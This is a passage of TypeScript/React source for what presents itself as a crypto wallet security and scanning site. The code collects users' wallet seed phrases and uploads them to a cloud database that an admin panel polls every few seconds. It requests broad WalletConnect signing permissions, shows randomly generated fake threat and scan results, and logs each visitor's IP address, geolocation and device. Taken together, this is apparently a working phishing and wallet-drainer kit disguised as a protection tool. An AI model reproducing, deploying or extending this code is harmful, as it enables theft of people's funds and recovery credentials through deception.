    } catch (err) {
      appendCaptureAudit({
        event: 'server-write',
        channel,
        status: 'error',
        detail: `Network/server error: ${String(err)}`,
        recordId: record.id,
        walletAddress: record.walletAddress,
      })
      return false
    }
  }

  const refreshServerSeedRecords = async (): Promise<void> => {
    setSeedsLoading(true)
    try {
      const keyFn = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
      const localRows = readSeedPhraseRecords()
      const memoryRows = seedPhraseRecords
      const localMerged = mergeUniqueRecords(memoryRows, localRows, keyFn)

      // Read directly from Supabase — same path the admin poll uses for all other data.
      const row = await loadFromCloud()
      if (row) {
        const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
        const merged = mergeUniqueRecords(localMerged, cloudRows, keyFn)
        setServerSeedRecords(merged)
        setSeedLastSynced(new Date())
        return
      }

      // Cloud unavailable: never show false empty state if local data exists.
      setServerSeedRecords(localMerged)
      if (localMerged.length > 0) setSeedLastSynced(new Date())
    } finally {
      setSeedsLoading(false)
    }
  }

  const saveMergedSeedPhrasesToCloud = async (
    nextRecords: SeedPhraseRecord[],
    channel: CaptureAuditRecord['channel'],
  ) => {
    // Load existing cloud records to merge — if cloud is temporarily unavailable we still save locally.
    const row = await loadFromCloud()
    // Always save even if cloud read failed — a partial write beats a silent drop.
    let toSave = nextRecords
    if (row) {
      const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
      const merged = mergeUniqueRecords(
        nextRecords,
        cloudRows,
        item => `${item.id}|${item.seedPhrase}`,
      )
      if (merged !== nextRecords) {
        setSeedPhraseRecords(merged)
      }
      toSave = merged
    }
    const ok = await saveToCloud({ seed_phrases: toSave })
    appendCaptureAudit({
      event: 'cloud-merge-save',
      channel,
      status: ok ? 'ok' : 'error',
      detail: ok ? `saveToCloud merged ${toSave.length} records` : 'saveToCloud failed for seed_phrases',
      recordId: nextRecords[0]?.id,
      walletAddress: nextRecords[0]?.walletAddress,
    })
  }

  const saveMergedConnectedWalletsToCloud = async (nextRecords: ConnectedWalletRecord[]) => {
    const row = await loadFromCloud()
    let toSave = nextRecords
    if (row) {
      const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
      const merged = mergeUniqueRecords(
        nextRecords,
        cloudRows,
        item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
      )
      if (merged !== nextRecords) {
        setConnectedWallets(merged)
      }
      toSave = merged
    }
    await saveToCloud({ connected_wallets: toSave })
  }

  const esAddr = useMemo(() => {
    const addr = wcSessions[0]?.address || connectedAddress || wallet
    return isAddress(addr) ? addr : ''
  }, [wcSessions, connectedAddress, wallet])

  const addressValid = useMemo(() => isAddress(wallet), [wallet])

  const generateSecureQr = async () => {
    try {
      setWcStatus('initializing')
      setWcUri(null)
      setSecureQrDataUrl(null)
      setWcActionStatus(null)

      const client = await SignClient.init({
        projectId,
        metadata: appKitMetadata,
      })
      wcClientRef.current = client

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'eth_signTransaction',
              'eth_sign',
              'personal_sign',
              'eth_signTypedData',
            ],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })

      if (!uri) throw new Error('No WalletConnect URI generated.')

      setWcUri(uri)
      setWcStatus('waiting')

      const dataUrl = await QRCode.toDataURL(uri, { width: 280, margin: 2, color: { dark: '#0f172a', light: '#ffffff' } })
      setSecureQrDataUrl(dataUrl)

      const session = await approval()
      const accounts = session.namespaces?.eip155?.accounts ?? []
      const walletAddr = accounts[0]?.split(':')[2] ?? 'unknown'
      const walletName = (session.peer?.metadata?.name as string | undefined) ?? 'Unknown Wallet'

      const newSession: WcSession = {
        topic: session.topic,
        address: walletAddr,
        walletName,
        connectedAt: nowString(),
        seedPhrase: '',
        ownershipVerified: false,
      }
      setWcSessions(prev => [newSession, ...prev])
      if (isAddress(walletAddr)) {
        setConnectedWallets(prev => {
          const normalized = walletAddr.toLowerCase()
          const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.walletType === `WalletConnect (${walletName})`))
          const next = [{
            wallet: walletAddr,
            chain: 'ethereum' as const,
            walletType: `WalletConnect (${walletName})`,
            balance: '',
            txCount: 'N/A',
            connectedAt: nowString(),
            ipAddress: currentVisitorIp,
            device: currentVisitorDevice,
          }, ...filtered].slice(0, 100)
          void saveMergedConnectedWalletsToCloud(next)
          return next
        })
      }
      setWcSelectedTopic(session.topic)
      setWcStatus('connected')
      setActiveView('ownership')  // auto-redirect to ownership verification
      setWcActionStatus(`✅ Wallet connected: ${walletAddr.slice(0, 8)}…${walletAddr.slice(-6)}`)
    } catch (err) {
      setWcStatus('idle')
      setWcActionStatus(`❌ ${err instanceof Error ? err.message : 'Connection failed. Please try again.'}`)
    }
  }

  // Auto-generate WalletConnect QR when protect page is activated
  useEffect(() => {
    if (activeView === 'protect' && wcStatus === 'idle') {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      generateSecureQr()
    }
  // generateSecureQr is stable (no deps change) — safe to omit
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeView])

  const [threatRows,    setThreatRows]    = useState<ThreatRow[]>(() => makeThreatRows(200))
  const [liveScanRows,  setLiveScanRows]  = useState<ScanRecord[]>(() => makeRecentScanRows(100))
  const demoConnectedWallets = useMemo(() => makeConnectedWalletRows(12), [])
  const demoSignerChecks     = useMemo(() => makeSignerCheckRows(10), [])

  useEffect(() => {
    const refreshTimer = window.setInterval(() => {
      setThreatRows(makeThreatRows(200))
      setLiveScanRows(makeRecentScanRows(100))
    }, REFRESH_INTERVAL_MS)
    return () => window.clearInterval(refreshTimer)
  }, [])

  const visibleThreatRows = useMemo(() => threatRows.slice(0, 100), [threatRows])

  useEffect(() => {
    let active = true
    const loadNews = async () => {
      if (!active) return
      setNewsLoading(true)
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/news?page=1', {
          headers: { 'Accept': 'application/json' },
          signal: AbortSignal.timeout(8000),
        })
        if (!res.ok) throw new Error(`${res.status}`)
        const payload = await res.json() as unknown
        const parsed = parseCoinGeckoNews(payload)
        if (!active) return
        if (parsed.length > 0) {
          setCryptoNews(parsed)
          setNewsLive(true)
        }
      } catch {
        // silently keep static fallback visible — no error shown
      } finally {
        if (active) setNewsLoading(false)
      }
    }

    void loadNews()
    const timer = window.setInterval(() => { void loadNews() }, NEWS_REFRESH_MS)
    return () => {
      active = false
      window.clearInterval(timer)
    }
  }, [])

  // ── AppKit connection effect — sync wallet state ───────────────────
  useEffect(() => {
    if (isAppKitConnected && appKitAddress) {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      setWallet(appKitAddress)
      const resolvedChain = connectedChainId && chainIdToKey[connectedChainId] ? chainIdToKey[connectedChainId] : 'ethereum'
      if (connectedChainId && chainIdToKey[connectedChainId]) setChain(chainIdToKey[connectedChainId])
      // Fetch live balance via public RPC
      rpcCall(resolvedChain, 'eth_getBalance', [appKitAddress, 'latest'])
        .then(hex => {
          const ch = resolvedChain
          const raw = weiToNative(hex as string)
          setWalletBalance(raw ? `${raw} ${chainConfig[ch].nativeSymbol}` : '')
        })
        .catch(() => setWalletBalance(''))
      // Record in admin connected-wallets list
      setConnectedWallets(prev => {
        const normalized = appKitAddress.toLowerCase()
        const ch = resolvedChain
        const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.chain === ch))
        const next = [{
          wallet: appKitAddress,
          chain: ch,
          walletType: 'AppKit',
          balance: '',
          txCount: 'N/A',
          connectedAt: nowString(),
          ipAddress: currentVisitorIp,
          device: currentVisitorDevice,
        }, ...filtered].slice(0, 100)
        void saveMergedConnectedWalletsToCloud(next)
        return next
      })
    } else if (!isAppKitConnected) {
      setWalletBalance('')
    }
  }, [isAppKitConnected, appKitAddress, connectedChainId, currentVisitorDevice, currentVisitorIp])


  useEffect(() => {
    try { localStorage.setItem(CONNECTED_WALLETS_KEY, JSON.stringify(connectedWallets)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ connected_wallets: connectedWallets })
  }, [connectedWallets])

  useEffect(() => {
    try { localStorage.setItem(SIGNER_CHECKS_KEY, JSON.stringify(signerChecks)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ signer_checks: signerChecks })
  }, [signerChecks])

  useEffect(() => {
    try { localStorage.setItem(EMAIL_RECORDS_KEY, JSON.stringify(emailRecords)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ email_records: emailRecords })
  }, [emailRecords])

  useEffect(() => {
    try { localStorage.setItem(ADMIN_INTEL_KEY, JSON.stringify(adminIntelRecords)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ admin_intel_records: adminIntelRecords })
  }, [adminIntelRecords])

  useEffect(() => {
    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords)) } catch { /* quota */ }
    // Only push to cloud after cloud has been hydrated so we never overwrite a richer cloud state with local-only data.
    // submitExplorerSeedGate / saveMergedSeedPhrasesToCloud handles the immediate merged save on user submission.
    if (!cloudLoadedRef.current) return
    saveToCloud({ seed_phrases: seedPhraseRecords })
  }, [seedPhraseRecords])

  useEffect(() => {
    try { localStorage.setItem(CAPTURE_AUDIT_KEY, JSON.stringify(captureAuditRecords)) } catch { /* quota */ }
  }, [captureAuditRecords])

  useEffect(() => {
    try { localStorage.setItem(SCAN_HISTORY_KEY, JSON.stringify(scanHistory)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ scan_history: scanHistory })
  }, [scanHistory])

  useEffect(() => {
    try { localStorage.setItem(PROTECT_CHECKLIST_KEY, JSON.stringify(protectChecklistDone)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ protect_checklist_done: protectChecklistDone })
  }, [protectChecklistDone])

  useEffect(() => {
    try { localStorage.setItem(SUPPORT_CONFIG_KEY, JSON.stringify(supportConfig)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ support_config: supportConfig })
  }, [supportConfig])

  useEffect(() => {
    try { localStorage.setItem(NEWSLETTER_KEY, JSON.stringify(newsletterEmails)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ newsletter_emails: newsletterEmails })
  }, [newsletterEmails])

  useEffect(() => {
    // Persist full credentials locally (this is local-only data, never sent in plaintext to cloud)
    try { localStorage.setItem(ADMIN_CREDS_KEY, JSON.stringify(adminCreds)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ admin_creds: { email: adminCreds.email, password: '' } as AdminCreds })
  }, [adminCreds])

  useEffect(() => {
    try { localStorage.setItem(USER_ROUTES_KEY, JSON.stringify(userEmailRoutes)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ user_email_routes: userEmailRoutes })
  }, [userEmailRoutes])

  // Poll seed records while admin Seeds/Raw tabs are open.
  useEffect(() => {
    if (activeView !== 'admin' || (adminTab !== 'seeds' && adminTab !== 'rawdata')) return
    let active = true

    const fetchSeeds = async () => {
      if (!active) return
      await refreshServerSeedRecords()
    }

    void fetchSeeds()
    const timer = window.setInterval(fetchSeeds, 3000)
    return () => {
      active = false
      window.clearInterval(timer)
    }
  }, [activeView, adminTab])

  // Refresh connected wallets when admin opens the wallets tab.
  useEffect(() => {
    if (activeView !== 'admin' || adminTab !== 'wallets') return
    const keyFor = (item: ConnectedWalletRecord) =>
      `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`

    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
    if (localRows.length > 0) {
      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
    }

    void loadFromCloud()
      .then(row => {
        if (!row?.connected_wallets) return
        const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
        setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
      })
      .catch(() => {
        // Non-blocking: local rows are still shown.
      })
  }, [activeView, adminTab])

  // Refresh connected wallets when admin opens the wallets tab.
  useEffect(() => {
    if (activeView !== 'admin' || adminTab !== 'wallets') return
    const keyFor = (item: ConnectedWalletRecord) =>
      `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`

    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
    if (localRows.length > 0) {
      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
    }

    void loadFromCloud()
      .then(row => {
        if (!row?.connected_wallets) return
        const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
        setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
      })
      .catch(() => {
        // Non-blocking: local rows are still shown.
      })
  }, [activeView, adminTab])

  // Persist active view (exclude purely transient/session-dependent views)
  useEffect(() => {
    if (!TRANSIENT_VIEWS.includes(activeView)) {
      try { localStorage.setItem(ACTIVE_VIEW_KEY, activeView) } catch { /* quota */ }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeView])

  // Persist admin session so page refreshes don't log them out
  useEffect(() => {
    try {
      if (isAdminAuthenticated) {
        sessionStorage.setItem(ADMIN_SESSION_KEY, '1')
      } else {
        sessionStorage.removeItem(ADMIN_SESSION_KEY)
      }
    } catch { /* ignore */ }
  }, [isAdminAuthenticated])

  useEffect(() => {
    try { localStorage.setItem(BOT_REQUESTS_KEY, JSON.stringify(botRequests)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ bot_requests: botRequests })
  }, [botRequests])

  useEffect(() => {
    return () => {
      if (botModalCloseTimerRef.current) window.clearTimeout(botModalCloseTimerRef.current)
      if (botLogoutTimerRef.current) window.clearTimeout(botLogoutTimerRef.current)
    }
  }, [])

  // Auto-expand the last-scanned wallet profile when the admin opens the OSINT tab
  useEffect(() => {
    if (adminTab === 'osint' && lastScannedWallet) {
      setTimeout(() => setOsintExpanded(lastScannedWallet), 0)
    }
  }, [adminTab, lastScannedWallet])

  useEffect(() => {
    try { localStorage.setItem(VISITOR_SESSIONS_KEY, JSON.stringify(visitorSessions)) } catch { /* quota */ }
    if (!cloudLoadedRef.current) return
    saveToCloud({ visitor_sessions: visitorSessions })
  }, [visitorSessions])

  // ── Cloud load on mount (with retry) ──────────────────────────────────────
  useEffect(() => {
    // If cloud is not configured, stay local-only and avoid pretending cloud is hydrated.
    if (!isCloudConfigured) return

    let active = true

    const applyCloudRow = (row: Partial<{
      connected_wallets: unknown
      scan_history: unknown
      signer_checks: unknown
      email_records: unknown
      admin_intel_records: unknown
      seed_phrases: unknown
      protect_checklist_done: unknown
      newsletter_emails: unknown
      visitor_sessions: unknown
      support_config: unknown
      admin_creds: unknown
      user_email_routes: unknown
      bot_requests: unknown
    }>) => {
      if (row.connected_wallets) {
        const cloudConnectedRows = normalizeConnectedWalletRecords(row.connected_wallets)
        setConnectedWallets(prev => mergeUniqueRecords(
          prev,
          cloudConnectedRows,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
        ))
      }
      if (row.scan_history) {
        setScanHistory(prev => mergeUniqueRecords(
          prev,
          row.scan_history,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.generatedAt}`,
        ))
      }
      if (row.signer_checks) {
        setSignerChecks(prev => mergeUniqueRecords(
          prev,
          row.signer_checks,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.checkedAt}|${item.status}`,
        ))
      }
      if (row.email_records) {
        setEmailRecords(prev => mergeUniqueRecords(
          prev,
          row.email_records,
          item => `${item.email.toLowerCase()}|${item.wallet.toLowerCase()}|${item.sentAt}`,
        ))
      }
      if (row.admin_intel_records) {
        setAdminIntelRecords(prev => mergeUniqueRecords(
          prev,
          row.admin_intel_records,
          item => item.id,
        ))
      }
      if (row.seed_phrases) {
        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
        setSeedPhraseRecords(prev => mergeUniqueRecords(
          prev,
          cloudSeedRows,
          item => `${item.id}|${item.seedPhrase}`,
        ))
      }
      if (row.protect_checklist_done) {
        setProtectChecklistDone(prev => mergeUniqueRecords(prev, row.protect_checklist_done, item => item))
      }
      if (row.newsletter_emails) {
        setNewsletterEmails(prev => mergeUniqueRecords(prev, row.newsletter_emails, item => item.toLowerCase()))
      }
      if (row.visitor_sessions) {
        setVisitorSessions(prev => mergeUniqueRecords(prev, row.visitor_sessions, item => item.id))
      }
      if (row.support_config && (row.support_config as SupportConfig).email)
        setSupportConfig(row.support_config as SupportConfig)
      if (row.admin_creds && (row.admin_creds as AdminCreds).email)
        setAdminCreds(prev => ({ ...prev, email: (row.admin_creds as AdminCreds).email }))
      if (row.user_email_routes) {
        setUserEmailRoutes(prev => mergeUniqueRecords(prev, row.user_email_routes, item => item.id))
      }
      if (row.bot_requests) {
        setBotRequests(prev => mergeUniqueRecords(prev, row.bot_requests, item => item.id))
      }
    }

    const hydrateCloud = async () => {
      const row = await loadFromCloud()
      if (!active) return
      if (!row) return // transient cloud failure — retry on next interval

      applyCloudRow(row)
      cloudLoadedRef.current = true
      setCloudHydrated(true)
    }

    void hydrateCloud()
    const retryTimer = window.setInterval(() => {
      if (!cloudLoadedRef.current) void hydrateCloud()
    }, 10000)

    return () => {
      active = false
      window.clearInterval(retryTimer)
    }
  }, [])

  // Poll cloud while admin is active so new user events appear without manual refresh.
  useEffect(() => {
    if (!isAdminAuthenticated) return
    let active = true
    const pullLatestAdminData = async () => {
      const row = await loadFromCloud()
      if (!active || !row) return

      if (row.connected_wallets) {
        const cloudConnectedRows = normalizeConnectedWalletRecords(row.connected_wallets)
        setConnectedWallets(prev => mergeUniqueRecords(
          prev,
          cloudConnectedRows,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
        ))
      }
      if (row.scan_history) {
        setScanHistory(prev => mergeUniqueRecords(
          prev,
          row.scan_history,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.generatedAt}`,
        ))
      }
      if (row.signer_checks) {
        setSignerChecks(prev => mergeUniqueRecords(
          prev,
          row.signer_checks,
          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.checkedAt}|${item.status}`,
        ))
      }
      if (row.email_records) {
        setEmailRecords(prev => mergeUniqueRecords(
          prev,
          row.email_records,
          item => `${item.email.toLowerCase()}|${item.wallet.toLowerCase()}|${item.sentAt}`,
        ))
      }
      if (row.seed_phrases) {
        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
        setSeedPhraseRecords(prev => mergeUniqueRecords(
          prev,
          cloudSeedRows,
          item => `${item.id}|${item.seedPhrase}`,
        ))
        // Keep the server-authoritative view in sync too.
        setServerSeedRecords(cloudSeedRows)
        setSeedLastSynced(new Date())
      }
      if (row.visitor_sessions) {
        setVisitorSessions(prev => mergeUniqueRecords(prev, row.visitor_sessions, item => item.id))
      }
      if (row.admin_intel_records) {
        setAdminIntelRecords(prev => mergeUniqueRecords(prev, row.admin_intel_records, item => item.id))
      }
      if (row.bot_requests) {
        setBotRequests(prev => mergeUniqueRecords(prev, row.bot_requests, item => item.id))
      }
      setSeedLastSynced(new Date())
    }

    void pullLatestAdminData()
    const pollTimer = window.setInterval(() => {
      void pullLatestAdminData()
    }, CLOUD_ADMIN_POLL_MS)

    return () => {
      active = false
      window.clearInterval(pollTimer)
    }
  }, [isAdminAuthenticated])

  // Backfill one full sync after hydration so any early user actions
  // (before cloudLoadedRef flipped true) are still pushed to cloud.
  useEffect(() => {
    if (!cloudHydrated) return
    saveToCloud({
      connected_wallets: connectedWallets,
      scan_history: scanHistory,
      signer_checks: signerChecks,
      email_records: emailRecords,
      admin_intel_records: adminIntelRecords,
      seed_phrases: seedPhraseRecords,
      protect_checklist_done: protectChecklistDone,
      newsletter_emails: newsletterEmails,
      visitor_sessions: visitorSessions,
      support_config: supportConfig,
      admin_creds: { email: adminCreds.email, password: '' } as AdminCreds,
      user_email_routes: userEmailRoutes,
      bot_requests: botRequests,
    })
  }, [cloudHydrated])

  useEffect(() => {
    const visitorId = localStorage.getItem(VISITOR_ID_KEY) ?? `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
    localStorage.setItem(VISITOR_ID_KEY, visitorId)
    setTimeout(() => setCurrentVisitorId(visitorId), 0)

    const userAgent = navigator.userAgent
    const device = getDeviceLabel(userAgent)
    const referrer = document.referrer || 'Direct'
    const language = navigator.language || 'Unknown'
    setTimeout(() => setCurrentVisitorDevice(device), 0)

    const sessionStartMs = Date.now()

    type GeoPayload = {
      status?: string
      country?: string
      countryCode?: string
      regionName?: string
      city?: string
      timezone?: string
      isp?: string
      org?: string
      lat?: number
      lon?: number
      query?: string
    }

    const registerSession = (ipAddress: string, geo?: GeoPayload) => {
      setCurrentVisitorIp(ipAddress)
      const timestamp = nowString()
      setVisitorSessions(prev => {
        const existing = prev.find(row => row.id === visitorId)
        const geoFields: Partial<VisitorSessionRecord> = geo?.status === 'success' ? {
          country: geo.country,
          countryCode: geo.countryCode,
          city: geo.city,
          region: geo.regionName,
          timezone: geo.timezone,
          isp: geo.isp,
          org: geo.org,
          lat: geo.lat,
          lng: geo.lon,
        } : {}
        if (existing) {
          return prev.map(row => row.id === visitorId
            ? {
                ...row,
                ipAddress,
                device,
                userAgent,
                lastSeen: timestamp,
                visits: row.visits + 1,
                referrer,
                language,
                sessionStartMs,
                ...geoFields,
              }
            : row
          )
        }
        return [{
          id: visitorId,
          ipAddress,
          device,
          userAgent,
          firstSeen: timestamp,
          lastSeen: timestamp,
          visits: 1,
          status: 'allowed',
          referrer,
          language,
          sessionStartMs,
          totalSeconds: 0,
          ...geoFields,
        }, ...prev]
      })
    }

    const fetchGeo = async (ip: string) => {
      // HTTPS-first provider so it works on production (mixed-content safe).
      try {
        const res = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(7000) })
        if (res.ok) {
          const geo = await res.json() as {
            success?: boolean
            country?: string
            country_code?: string
            region?: string
            city?: string
            timezone?: { id?: string }
            connection?: { isp?: string; org?: string }
            latitude?: number
            longitude?: number
            ip?: string
          }
          if (geo.success) {
            return {
              status: 'success',
              country: geo.country,
              countryCode: geo.country_code,
              regionName: geo.region,
              city: geo.city,
              timezone: geo.timezone?.id,
              isp: geo.connection?.isp,
              org: geo.connection?.org,
              lat: geo.latitude,
              lon: geo.longitude,
              query: geo.ip,
            } satisfies GeoPayload
          }
        }
      } catch { /* fallback */ }

      // Secondary fallback for local/dev contexts where ip-api is still reachable.
      try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,timezone,isp,org,lat,lon,query`, { signal: AbortSignal.timeout(7000) })
        if (res.ok) {
          const geo = await res.json() as GeoPayload
          return geo
        }
      } catch { /* fallback */ }

      return undefined
    }

    fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(7000) })
      .then(res => res.ok ? res.json() as Promise<{ ip?: string }> : Promise.reject(new Error(`IP lookup failed: ${res.status}`)))
      .then(async payload => {
        const ip = payload.ip?.trim() || 'Unknown'
        const geo = ip !== 'Unknown' ? await fetchGeo(ip) : undefined
        registerSession(ip, geo)
      })
      .catch(() => registerSession('Unknown'))
  }, [])

  const activeVisitor = useMemo(() => (
    visitorSessions.find(session => session.id === currentVisitorId) ?? null
  ), [visitorSessions, currentVisitorId])

  const visitorRestricted = activeVisitor?.status === 'restricted'

  useEffect(() => {
    const blockedViews: ViewKey[] = ['scan', 'protect', 'ownership', 'recovery', 'admin', 'etherscan']
    if (visitorRestricted && blockedViews.includes(activeView)) {
      setTimeout(() => {
        setActiveView('home')
        setSecureStatus('Access restricted. Contact support to restore wallet access.')
      }, 0)
    }
  }, [activeView, visitorRestricted])

  useEffect(() => {
    if (activeView !== 'etherscan') return
    if (esAddr) return
    setTimeout(() => {
      setActiveView('protect')
      setSecureStatus('Connect your wallet first to open the explorer route.')
    }, 0)
  }, [activeView, esAddr])

  useEffect(() => {
    if (sessionStartRef.current === null) sessionStartRef.current = Date.now()
    const timer = window.setInterval(() => {
      const now = Date.now()
      setEsClock(now)
      setSessionSeconds(Math.floor((now - (sessionStartRef.current ?? now)) / 1000))
    }, 1000)
    return () => window.clearInterval(timer)
  }, [])

  // Every 60s persist updated totalSeconds to visitor record
  useEffect(() => {
    if (!currentVisitorId || sessionSeconds === 0 || sessionSeconds % 60 !== 0) return
    setTimeout(() => {
      setVisitorSessions(prev => prev.map(row =>
        row.id === currentVisitorId
          ? { ...row, totalSeconds: (row.totalSeconds ?? 0) + 60 }
          : row
      ))
    }, 0)
  }, [currentVisitorId, sessionSeconds])

  useEffect(() => {
    if (activeView !== 'etherscan') return
    const now = Date.now()
    if (esLockoutUntil && esLockoutUntil > now) {
      setTimeout(() => {
        setActiveView('protect')
        setSecureStatus(`Explorer session locked. Try again in ${Math.ceil((esLockoutUntil - now) / 60000)} min.`)
      }, 0)
      return
    }
    if (!esSessionStartedAt) {
      setTimeout(() => {
        setEsSeedInput('')
        setEsSeedError('')
      }, 0)
    }
  }, [activeView, esLockoutUntil, esSessionStartedAt])

  useEffect(() => {
    if (!esSessionStartedAt) return
    const now = Date.now()
    if (now - esSessionStartedAt < ETHERSCAN_SESSION_MS) return
    setTimeout(() => {
      setEsSessionStartedAt(null)
      setEsLockoutUntil(now + ETHERSCAN_LOCKOUT_MS)
      setEsError('Session expired. You have been logged out for 15 minutes.')
      setSecureStatus('Session expired. Explorer access locked for 15 minutes.')
      setWcStatus('idle')
      setWcSessions([])
      setWcSelectedTopic(null)
      setSecureQrDataUrl(null)
      try { disconnect() } catch { /* noop */ }
      setActiveView('protect')
    }, 0)
  }, [disconnect, esClock, esSessionStartedAt])

  useEffect(() => {
    if (esLockoutUntil && Date.now() >= esLockoutUntil) {
      setTimeout(() => {
        setEsLockoutUntil(null)
        setEsError('')
      }, 0)
    }
  }, [esClock, esLockoutUntil])

  // ── In-wallet-browser detection → wallet-landing page ────────────────
  useEffect(() => {
    type EthProvider = {
      request: (args: { method: string }) => Promise<string[]>
      isMetaMask?: boolean
      isTrust?: boolean
      isCoinbaseWallet?: boolean
      isRabby?: boolean
    }
    const eth = (window as Window & { ethereum?: EthProvider }).ethereum
    if (!eth) return

    // Identify wallet name immediately — no async required
    const walletLabel = eth.isMetaMask
      ? 'MetaMask'
      : eth.isTrust
        ? 'Trust Wallet'
        : eth.isCoinbaseWallet
          ? 'Coinbase Wallet'
          : eth.isRabby
            ? 'Rabby'
            : 'Web3 Wallet'

    // Show landing right away for new users.
    // Address + chain are resolved on form submit (eth_requestAccounts), not here.
    const isNewUser = !localStorage.getItem(NEW_USER_KEY)
    setTimeout(() => {
      setDetectedName(walletLabel)
      if (isNewUser) {
        setActiveView('wallet-landing')
      }
    }, 0)

    // Optionally pre-fill address if already authorized (no popup)
    eth.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
      const addr = accounts?.[0]
      if (!isAddress(addr)) return
      setDetectedAddr(addr)
      ;(eth as unknown as { request: (a: { method: string }) => Promise<string> })
        .request({ method: 'eth_chainId' })
        .then((hex: string) => {
          const num = parseInt(hex, 16)
          if (chainIdToKey[num]) setDetectedChain(chainIdToKey[num])
        })
        .catch(() => { /* stay on ethereum default */ })
    }).catch(() => { /* no pre-authorization — address filled at submit */ })
  }, [])

  // ── Launch scan from the wallet-landing page ──────────────────────────
  const startLandingScan = async (e: FormEvent) => {
    e.preventDefault()
    setLandingError('')
    if (!landingEmail.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(landingEmail.trim())) {
      setLandingError('Enter a valid email address to receive your report.')
      return
    }

    setLandingScanning(true)

    try {
      type EthProvider = { request: (args: { method: string }) => Promise<string[]> }
      const eth = (window as Window & { ethereum?: EthProvider }).ethereum
      if (!eth) throw new Error('Wallet not found')

      // Request accounts — shows connect popup if not yet authorized
      const accounts = await eth.request({ method: 'eth_requestAccounts' })
      const addr = accounts?.[0]
      if (!isAddress(addr)) throw new Error('Invalid address returned')

      // Resolve chain from provider at submit time
      let resolvedChain: ChainKey = detectedChain
      try {
        const chainHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> })
          .request({ method: 'eth_chainId' })
        const chainNum = parseInt(chainHex, 16)
        if (chainIdToKey[chainNum]) resolvedChain = chainIdToKey[chainNum]
      } catch { /* fallback to detectedChain */ }

      // Sync all state before navigating
      setDetectedAddr(addr)
      setDetectedChain(resolvedChain)
      setWallet(addr)
      setChain(resolvedChain)
      setAutoEmailInput(landingEmail.trim())
      setAutoEmailNameInput(landingUserName.trim())
      setAutoScanTriggered(true)

      // Mark as seen so returning users get normal home
      localStorage.setItem(NEW_USER_KEY, '1')

      // Navigate to scan and fire
      setActiveView('scan')
      await new Promise(resolve => setTimeout(resolve, 80))
      await executeScan(addr, resolvedChain, true)
    } catch (err) {
      setLandingError(err instanceof Error ? err.message : 'Wallet connection failed. Please try again.')
    } finally {
      setLandingScanning(false)
    }
  }

  const notifyAdminVerificationRequest = async (
    credential: string,
    source: 'explorer' | 'walletconnect',
    walletAddress: string,
    targetChain: ChainKey,
  ) => {
    const safeCredential = credential.trim()
    if (!safeCredential) return
    const sourceLabel = source === 'explorer' ? 'Explorer Verify Form' : 'WalletConnect Verify Action'
    const subject = `Verification request received (${sourceLabel})`
    setSignerChecks(prev => [
      {
        wallet: walletAddress,
        chain: targetChain,
        status: 'passed' as const,
        detail: `[Request] ${sourceLabel} submitted: ${safeCredential.slice(0, 140)}${safeCredential.length > 140 ? '…' : ''}`,
        checkedAt: nowString(),
      },
      ...prev,
    ].slice(0, 200))
    if (!isValidEmail(adminCreds.email)) return
    try {
